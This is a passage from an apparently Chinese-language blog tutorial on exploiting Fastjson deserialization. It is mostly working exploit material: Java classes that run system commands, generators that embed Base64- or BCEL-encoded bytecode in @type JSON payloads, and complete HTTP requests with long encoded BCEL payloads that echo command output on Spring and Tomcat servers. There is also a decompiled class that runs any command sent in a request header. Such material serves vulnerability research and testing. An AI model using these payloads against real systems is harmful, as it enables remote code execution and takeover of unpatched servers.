e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>javac Evil.java编译该类</p>\n<p><img src=\"9TvpZnV2NudwpWE3O1tq4A8I7xfqyVFwPuGRsg-a7-g.png\" alt=\"image\"></p>\n<p>得到class</p>\n<p><img src=\"D14cKaQFIC1UrEbeZM-Cy5aGpQYTq0yzXoBvESQkHpM.png\" alt=\"image\"></p>\n<p>构造恶意类 编译 读取文件得到payload</p>\n<p>创建一个FastjsonTemplatesImpl类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FastjsonTemplatesImpl</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;E:\\\\code\\\\java_code\\\\vulnerability_Recurrence\\\\fastJsonSecNoNetwork\\\\src\\\\main\\\\java\\\\garck\\\\Evil.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">byteCode</span>  <span class=\"operator\">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">NASTY_CLASS</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;</span>+byteCode+<span class=\"string\">&quot;\\&quot;],&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#x27;_name&#x27;:&#x27;Evil&#x27;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;</span>;</span><br><span class=\"line\">        System.out.println(payload);</span><br><span class=\"line\"><span class=\"comment\">//反序列化</span></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>运行该类，成功反序列化</p>\n<p><img src=\"qSJhjl2bXeNe6ppqYEW6mGZg6lN_t2cPwSV6gRHUoVg.png\" alt=\"image\"></p>\n<h1 id=\"BasicDataSource（BCEL字节码利用）\"><a href=\"#BasicDataSource（BCEL字节码利用）\" class=\"headerlink\" title=\"BasicDataSource（BCEL字节码利用）\"></a>BasicDataSource（BCEL字节码利用）</h1><p>条件：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java <span class=\"number\">8</span>u251以后，bcel类被删除</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>利用链：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">Tomcat <span class=\"number\">8.0</span>以下使用 的链</span><br><span class=\"line\">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br><span class=\"line\"></span><br><span class=\"line\">Tomcat <span class=\"number\">8.0</span>以后使用 的链（内置的 DBCP2；与Tomcat容器集成使用）</span><br><span class=\"line\">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span><br><span class=\"line\"></span><br><span class=\"line\">数据库DBCP链接池（项目的通用数据库连接池实现，具有灵活的配置选项，并且可以自动管理和重复使用预配置数量的数据库连接来提升应用程序性能。不同项目间通用或需要更加灵活的配置选项）</span><br><span class=\"line\">org.apache.commons.dbcp.BasicDataSource</span><br></pre></td></tr></table></figure>\n<p>BasicDataSource攻击链只能用于Fastjson 1.2.24及更低版本；1.2.25 以后autotype默认开启</p>\n<p>而在tomcat中的 com.sun.org.apache.bcel.internal.util.ClassLoader 的loadclass方法中可以进行bcel字节码的加载。</p>\n<p>在payload包里面创建一个恶意类Test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>或者Exploit_win_calc.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit_win_calc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit_win_calc</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            String[] var1 = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(var1);</span><br><span class=\"line\">            var2.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var3) &#123;</span><br><span class=\"line\">            var3.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] var0)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit_win_calc</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建一个实现类fastJsonBecl.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck1;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">fastJsonBecl</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;E:\\\\code\\\\java_code\\\\vulnerability_Recurrence\\\\fastJsonSecNoNetwork\\\\src\\\\main\\\\java\\\\payload\\\\Exploit_win_calc.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">code</span> <span class=\"operator\">=</span> Utility.encode(bytes,<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">poc</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;aaa\\&quot;: &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;@type\\&quot;: \\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\&quot;,\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;driverClassLoader\\&quot;: &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;@type\\&quot;: \\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;,\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;driverClassName\\&quot;: \\&quot;$$BCEL$$&quot;</span>+ code+ <span class=\"string\">&quot;\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;: \\&quot;bbb\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        System.out.println(poc);</span><br><span class=\"line\">        JSON.parse(poc);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>运行之后只输出了poc没有其它</p>\n<p><img src=\"MRxwNLApm63jH7JPpwIA5YKELLg4Te2IQB4qQStOIaM.png\" alt=\"image\"></p>\n<p>原因是缺少了tomcat-dbcp依赖，在pom.xml中添加之后，更新一下即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.tomcat<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tomcat-dbcp<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>9.0.8<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>更新</p>\n<p><img src=\"wI2kunRadrOvUH-GcbIarrJgAV9NRGzTqnLMqKor4ps.png\" alt=\"image\"></p>\n<p>运行</p>\n<p><img src=\"tmT5IKKsM4I0A-MQGWkwC8Ok2fBjBsG-vYYpOFUBjbM.png\" alt=\"image\"></p>\n<h2 id=\"BCEL的EXP\"><a href=\"#BCEL的EXP\" class=\"headerlink\" title=\"BCEL的EXP\"></a>BCEL的EXP</h2><p>可用于解决不出网利用。 需要注意在Java 8u251以后，bcel类被删除。</p>\n<p>tomcat7</p>\n<p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p>\n<p>tomcat8及其以后</p>\n<p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>\n<h2 id=\"执行命令回显-Spring\"><a href=\"#执行命令回显-Spring\" class=\"headerlink\" title=\"执行命令回显(Spring)\"></a>执行命令回显(Spring)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /json HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">9092</span></span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">cmd: whoami</span><br><span class=\"line\">Content-Length: <span class=\"number\">3327</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;x&quot;</span>:&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>: <span class=\"string\">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;: <span class=\"string\">&quot;x&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"EXP-Spring\"><a href=\"#EXP-Spring\" class=\"headerlink\" title=\"EXP(Spring)\"></a>EXP(Spring)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class=\"line\"><span class=\"comment\">// (powered by Fernflower decompiler)</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">package</span> com.fastjson.vul;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SpringEcho</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SpringEcho</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">var0</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var1</span> <span class=\"operator\">=</span> var0.getMethod(<span class=\"string\">&quot;getRequestAttributes&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> var1.invoke((Object)<span class=\"literal\">null</span>);</span><br><span class=\"line\">            var0 = Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class=\"line\">            var1 = var0.getMethod(<span class=\"string\">&quot;getResponse&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var0.getMethod(<span class=\"string\">&quot;getRequest&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var4</span> <span class=\"operator\">=</span> var1.invoke(var2);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var5</span> <span class=\"operator\">=</span> var3.invoke(var2);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var6</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class=\"string\">&quot;getWriter&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var7</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class);</span><br><span class=\"line\">            var7.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            var6.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var8</span> <span class=\"operator\">=</span> var6.invoke(var4);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">var9</span> <span class=\"operator\">=</span> (String)var7.invoke(var5, <span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            String[] var10 = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toUpperCase().contains(<span class=\"string\">&quot;WIN&quot;</span>)) &#123;</span><br><span class=\"line\">                var10[<span class=\"number\">0</span>] = <span class=\"string\">&quot;cmd&quot;</span>;</span><br><span class=\"line\">                var10[<span class=\"number\">1</span>] = <span class=\"string\">&quot;/c&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                var10[<span class=\"number\">0</span>] = <span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">                var10[<span class=\"number\">1</span>] = <span class=\"string\">&quot;-c&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            var10[<span class=\"number\">2</span>] = var9;</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;println&quot;</span>, String.class).invoke(var8, (<span class=\"keyword\">new</span> <span class=\"title class_\">Scanner</span>(Runtime.getRuntime().exec(var10).getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>).next());</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;flush&quot;</span>).invoke(var8);</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;close&quot;</span>).invoke(var8);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var11) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"执行命令回显-Tomcat\"><a href=\"#执行命令回显-Tomcat\" class=\"headerlink\" title=\"执行命令回显(Tomcat)\"></a>执行命令回显(Tomcat)</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">PUT /tmall/admin/product/173 HTTP/1.1</span><br><span class=\"line\">Host: 192.168.75.154:8090</span><br><span class=\"line\">User-Agent: Mozilla/9.0 (Macintosh; M2 Mac OS X 16.12; rv:129.0) Gecko/20230101 Firefox/169.0</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">Content-Length: 9784</span><br><span class=\"line\">Testecho:1</span><br><span class=\"line\">Testcmd:id</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ